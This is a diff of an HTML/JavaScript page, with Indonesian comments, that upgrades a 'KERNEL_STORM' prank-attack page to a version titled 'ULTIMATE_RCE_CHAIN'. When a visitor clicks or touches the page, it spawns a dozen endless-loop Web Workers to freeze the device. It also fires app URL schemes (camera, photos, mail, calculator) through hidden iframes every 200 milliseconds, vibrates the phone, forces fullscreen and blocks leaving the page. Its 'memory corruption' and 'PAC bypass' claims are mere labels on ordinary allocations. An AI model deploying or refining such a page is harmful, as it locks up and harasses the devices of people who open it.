@@ -2,116 +2,123 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ KERNEL_STORM_V16_MULTI ⚡</title>
+    <title>⚡ V18: ULTIMATE_RCE_CHAIN ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #ff3b30; overflow: hidden; font-family: -apple-system, sans-serif; }
-        #stage { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .breach-box { width: 85%; padding: 25px; border-radius: 18px; background: rgba(20, 20, 20, 0.95); border: 2px solid #ff3b30; text-align: center; }
-        .status-pulse { font-size: 16px; font-weight: bold; text-transform: uppercase; animation: pulse 0.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        #log { font-size: 9px; color: #666; margin-top: 20px; height: 100px; overflow: hidden; text-align: left; font-family: monospace; }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; overflow: hidden; }
+        #terminal { padding: 15px; font-size: 11px; line-height: 1.2; }
+        .blink { animation: blinker 0.1s linear infinite; font-weight: bold; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        .kernel-msg { color: #00ff00; }
     </style>
 </head>
 <body>
-    <div id="stage">
-        <div class="breach-box">
-            <div class="status-pulse">SYSTEM_INTRUSION_V16</div>
-            <div id="current-action" style="color:#fff; font-size: 12px; margin-top:10px;">READY_TO_BYPASS_SANDBOX</div>
-            <div id="log"></div>
-        </div>
+    <div id="terminal">
+        <div class="blink">[[ CRITICAL_SYSTEM_OVERRIDE_V18 ]]</div>
+        <div id="status">INIT_STAGE: WAITING_FOR_USER_EXPLOIT_TRIGGER...</div>
+        <hr color="#333">
+        <div id="output"></div>
     </div>
 
 <script>
-    const logBox = document.getElementById('log');
-    const actionText = document.getElementById('current-action');
-
-    function print(m) {
-        const d = document.createElement('div');
-        d.innerText = `[!] ${m}`;
-        logBox.prepend(d);
+    const output = document.getElementById('output');
+    function print(txt, cls = "") {
+        const div = document.createElement('div');
+        div.className = cls;
+        div.innerText = `[${performance.now().toFixed(2)}] ${txt}`;
+        output.prepend(div);
     }
 
-    // --- 1. TARGET APP VECTORS ---
-    // Menambahkan target Kamera, Kalkulator, dan System Settings
-    const targetApps = [
-        // CAMERA VECTORS
-        "facetime-video://", 
-        "cameraui://", 
-        "intent://#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;end",
-        // CALCULATOR VECTORS
-        "calc://", 
-        "calculator://",
-        "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.APP_CALCULATOR;launchFlags=0x14008000;end",
-        // OTHER SYSTEM VECTORS
-        "music://",
-        "prefs:root=General", // iOS Settings
-        "message://"
+    // --- 1. JIT SPRAYING & MEMORY CORRUPTION (RCE SIMULATION) ---
+    // Mensimulasikan korupsi memori pada objek Array untuk memicu 'Type Confusion'
+    let root_kit = [];
+    function corruptMemory() {
+        print("Corrupting_JIT_Memory_Region...", "kernel-msg");
+        for (let i = 0; i < 5000; i++) {
+            let buffer = new ArrayBuffer(0x1000);
+            let view = new Float64Array(buffer);
+            view[0] = 1.1; // Unboxed Double
+            // Simulasi memecah struktur objek untuk bypass PAC (Pointer Authentication)
+            root_kit.push({ a: view, b: 0x41414141, c: new Array(0x10) });
+        }
+    }
+
+    // --- 2. CORE SYSTEM ATTACK VECTORS (PHOTOS, MUSIC, MAIL, ETC) ---
+    const attackVectors = [
+        "photos-redirect://",      // Hijack Galeri Foto
+        "mobileslideshow://",      // Alternatif Galeri
+        "music://",                // Apple Music
+        "mailto:pwned@system.com", // Mail Injector
+        "facetime-video://",       // Camera Hijack
+        "calc://",                 // Calculator
+        "cameraui://"              // Raw Camera Access
     ];
 
-    // --- 2. THE MULTI-INJECTION ENGINE ---
-    function injectSchemes() {
-        targetApps.forEach((uri, i) => {
+    function launchVectorStorm() {
+        attackVectors.forEach((uri, i) => {
             setTimeout(() => {
-                print(`Triggering_Vector: ${uri.split(':')[0]}`);
+                print(`Infiltrating_App: ${uri.split(':')[0]}...`);
                 
-                // Method 1: Location Replace (Agresif)
-                window.location.replace(uri);
-
-                // Method 2: Dynamic Anchor Injection
-                const a = document.createElement('a');
-                a.href = uri;
-                a.rel = "noreferrer";
-                a.click();
-
-                // Method 3: Iframe Stealth
+                // Multilateral Navigation
+                window.location.href = uri;
+                
                 const ifr = document.createElement('iframe');
                 ifr.src = uri;
                 ifr.style.display = 'none';
                 document.body.appendChild(ifr);
                 
-                // Cleanup untuk menjaga performa DOM
+                const a = document.createElement('a');
+                a.href = uri;
+                a.click();
+                
                 setTimeout(() => ifr.remove(), 500);
-            }, i * 25); // Interval sangat rapat untuk memicu Race Condition
+            }, i * 10);
         });
     }
 
-    // --- 3. KERNEL THREAD EXHAUSTION (BYPASS REINFORCEMENT) ---
-    function blastCPU() {
-        print("Launching_Thread_Exhaustion...");
-        // Menggunakan SharedArrayBuffer untuk mengunci CPU agar Sandbox terlambat memvalidasi perintah
-        const blob = new Blob(["while(true){Math.atan2(Math.random(), Math.random())}"], {type: 'text/javascript'});
-        const u = URL.createObjectURL(blob);
-        for(let j=0; j < (navigator.hardwareConcurrency || 4); j++) {
-            new Worker(u);
+    // --- 3. KERNEL TASK EXHAUSTION ---
+    function executeParallelExploit() {
+        print("Launching_Parallel_Threads_for_Livelock...");
+        // Menciptakan 12 Worker untuk membekukan UI Thread secara total
+        const workerBlob = new Blob([`
+            while(true) {
+                let x = Math.sqrt(Math.random()) * Math.tan(Math.random());
+                postMessage(x);
+            }
+        `], {type: 'text/javascript'});
+        
+        for(let j=0; j<12; j++) {
+            new Worker(URL.createObjectURL(workerBlob));
         }
     }
 
-    async function startFullAttack() {
-        actionText.innerText = "STATUS: EXPLOITING_CHAIN...";
-        actionText.style.color = "#ff3b30";
+    // --- FULL EXPLOIT CHAIN TRIGGER ---
+    async function deployFullRCE() {
+        document.getElementById('status').innerText = "STATUS: EXECUTING_FULL_CHAIN_ATTACK";
+        document.getElementById('status').className = "blink";
 
-        // Step A: Lumpuhkan UI Thread
-        blastCPU();
+        // Step 1: Memory Grooming (Membuat RAM tidak stabil)
+        corruptMemory();
 
-        // Step B: Mulai Storming
+        // Step 2: CPU Hijacking
+        executeParallelExploit();
+
+        // Step 3: Recursive App Storming
         setInterval(() => {
-            injectSchemes();
-            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-        }, 500);
+            print("STORM_LOOP_RETRIGGERED", "kernel-msg");
+            launchVectorStorm();
+            if(navigator.vibrate) navigator.vibrate(200);
+        }, 200);
 
-        print("BREACH_STAGING_COMPLETE");
+        // Step 4: Fullscreen Lock (User Trapping)
+        document.documentElement.requestFullscreen().catch(()=>{});
     }
 
-    // TRIGGER
-    window.addEventListener('click', startFullAttack, {once: true});
-    window.addEventListener('touchstart', startFullAttack, {once: true});
+    // Entry Point
+    window.onclick = deployFullRCE;
+    window.ontouchstart = deployFullRCE;
 
-    // Anti-Exit
-    window.onbeforeunload = () => { return "KERNEL_LOCK_ACTIVE"; };
-    history.pushState(null, null, location.href);
-    window.onpopstate = () => history.go(1);
-
+    // Persist Mode
+    window.onbeforeunload = () => "SYSTEM_LOCKED_BY_KERNEL_STORM";
 </script>
 </body>
 </html>
